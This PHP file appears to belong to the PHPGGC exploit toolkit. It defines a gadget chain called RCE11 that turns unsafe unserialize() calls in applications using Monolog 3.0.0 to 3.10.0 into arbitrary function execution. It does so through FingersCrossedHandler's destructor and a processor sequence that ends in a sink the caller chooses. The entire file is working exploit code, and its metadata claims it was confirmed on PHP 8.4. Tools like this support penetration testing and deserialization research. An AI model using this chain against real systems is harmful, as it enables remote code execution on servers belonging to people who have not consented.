<?php

namespace GadgetChain\Monolog;

require_once __DIR__ . '/gadgets.php';

/**
 * Monolog 3.x — FingersCrossedHandler + processors (get_object_vars → end → function).
 * Generic gadget: triggers on unserialize() when Monolog classes are allowed.
 */
class RCE11 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '3.0.0 <= 3.10.0+';
    public static $vector = '__destruct';
    public static $author = 'mitsal';
    public static $information = 'Processors: get_object_vars → end → function(). Sink is user-selectable. Confirmed on PHP 8.4 + Monolog 3.0.0-3.10.0 (12/12 versions)';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Monolog\Handler\FingersCrossedHandler($function, $parameter);
    }
}
